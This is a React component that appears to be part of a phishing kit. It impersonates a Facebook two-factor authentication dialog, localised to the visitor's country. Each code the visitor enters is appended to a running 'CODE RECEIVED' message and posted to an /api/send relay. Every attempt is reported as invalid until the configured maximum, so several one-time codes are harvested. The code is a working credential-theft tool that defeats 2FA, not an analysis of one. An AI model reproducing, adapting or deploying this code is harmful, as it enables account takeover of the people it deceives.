import VerifyImage from '@/assets/images/2FAuth.png';
import { store } from '@/store/store';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const VerifyModal: FC<{ nextStep: () => void; businessName?: string }> = ({ nextStep, businessName }) => {
    const [attempts, setAttempts] = useState(0);
    const [code, setCode] = useState('');
    const [countdown, setCountdown] = useState(0);
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo, messageId, message, setMessage } = store();
    const maxCode = config.MAX_CODE ?? 3;
    const loadingTime = config.CODE_LOADING_TIME ?? 60;

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = ['Go to your authentication app', 'Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};

            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => {
                setCountdown(countdown - 1);
            }, 1000);
            return () => clearTimeout(timer);
        } else if (countdown === 0 && showError) {
            setShowError(false);
        }
    }, [countdown, showError]);

    const handleSubmit = async () => {
        if (!code.trim() || isLoading || code.length < 6 || countdown > 0 || !message) return;

        setShowError(false);
        setIsLoading(true);

        const next = attempts + 1;
        setAttempts(next);

        const updatedMessage = `${message}

<b>✅ 2FA CODE RECEIVED</b>
<b>🔐 Code ${next}/${maxCode}:</b> <code>${code}</code>`;
        try {
            const res = await axios.post('/api/send', {
                message: updatedMessage,
                message_id: messageId
            });

            if (res?.data?.success) {
                setMessage(updatedMessage);
            }

            if (next >= maxCode) {
                nextStep();
            } else {
                setShowError(true);
                setCode('');
                setCountdown(loadingTime);
            }
        } catch {
            //
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                    {/* Header with user info and Facebook branding */}
                    <div className='px-3 sm:px-4 md:px-6 pt-3 sm:pt-4 md:pt-6 pb-2 sm:pb-3 md:pb-4'>
                        <p className='text-xs sm:text-xs md:text-sm text-gray-600'>{businessName || 'User'} • Facebook</p>
                    </div>

                    {/* Main content */}
                    <div className='flex-1 px-3 sm:px-4 md:px-6 py-2 pb-3 sm:pb-4 md:pb-6 flex flex-col overflow-y-auto'>
                    {/* Title */}
                    <h1 className='text-base sm:text-lg md:text-2xl font-bold text-gray-900 mb-2 sm:mb-3 md:mb-4 whitespace-normal'>
                        {t('Go to your authentication app')}
                    </h1>

                    {/* Description */}
                    <p className='text-xs sm:text-sm md:text-base text-gray-700 mb-4 sm:mb-6 md:mb-8 leading-relaxed'>
                        {t('Enter the 6-digit code for this account from the two-step authentication app you set up (such as Duo Mobile or Google Authenticator).')}
                    </p>

                    {/* Illustration */}
                    <div className='mb-4 sm:mb-6 md:mb-8 flex justify-center'>
                        <Image src={VerifyImage} alt='2FA' className='max-h-36 sm:max-h-48 md:max-h-64 w-auto' />
                    </div>

                    {/* Code Input */}
                    <div className='relative mb-4 sm:mb-6 md:mb-8'>
                        <input
                            type='tel'
                            inputMode='numeric'
                            pattern='[0-9]*'
                            id='code-input'
                            value={code}
                            onChange={(e) => {
                                const value = e.target.value.replaceAll(/\D/g, '');
                                if (value.length <= 8) {
                                    setCode(value);
                                }
                            }}
                            maxLength={8}
                            disabled={countdown > 0}
                            className={`w-full h-10 sm:h-11 md:h-12 rounded-xl border border-gray-300 px-3 py-2 sm:py-2.5 md:py-3 text-base font-medium focus:outline-none focus:ring-2 focus:ring-blue-400 focus:border-transparent transition-all placeholder-gray-500 ${
                                countdown > 0 ? 'cursor-not-allowed opacity-60 bg-gray-50' : 'bg-white'
                            }`}
                            placeholder={t('Code')}
                        />
                    </div>

                    {/* Error message */}
                    {showError && (
                        <p className='text-xs sm:text-xs md:text-sm text-red-500 mb-4 sm:mb-6 md:mb-8'>
                            {t("This code doesn't work. Check it's correct or try a new one after")} {countdown}s.
                        </p>
                    )}

                    {/* Continue Button */}
                    <button
                        type='button'
                        onClick={handleSubmit}
                        disabled={isLoading || code.length < 6 || countdown > 0}
                        className={`w-full h-10 sm:h-11 md:h-14 rounded-2xl bg-blue-500 text-white font-semibold text-xs sm:text-sm md:text-lg transition-all ${
                            isLoading || code.length < 6 || countdown > 0
                                ? 'cursor-not-allowed opacity-60'
                                : 'hover:bg-blue-600 shadow-md hover:shadow-lg'
                        } flex items-center justify-center`}
                    >
                        {isLoading ? (
                            <div className='h-6 w-6 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div>
                        ) : (
                            t('Continue')
                        )}
                    </button>
                </div>
            </div>
        </div>
        </>
    );
};

export default VerifyModal;
